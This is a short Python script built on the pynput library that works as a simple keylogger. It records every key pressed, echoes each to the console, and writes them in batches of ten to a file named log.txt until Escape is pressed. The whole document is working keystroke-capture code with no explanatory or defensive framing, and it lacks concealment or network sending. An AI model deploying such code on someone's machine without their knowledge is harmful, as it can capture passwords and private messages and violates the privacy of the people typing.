from pynput.keyboard import Key, Listener

max_words = 10
count = 0
keys = []

def write_file(keys):
    with open("log.txt", "a+") as file:
        for key in keys:
            k = str(key).strip("'")
            if k.find("space") > 0:
                 file.write(" ")
            elif k.find("Key") == -1:
                 file.write(k)
            else:
                 file.write("\n" + str(key) + "\n")
            

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= max_words:
            count = 0
            write_file(keys)
            keys = []

def on_release(key):
    global keys
    if key == Key.esc:
        if keys is not None:
            write_file(keys)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()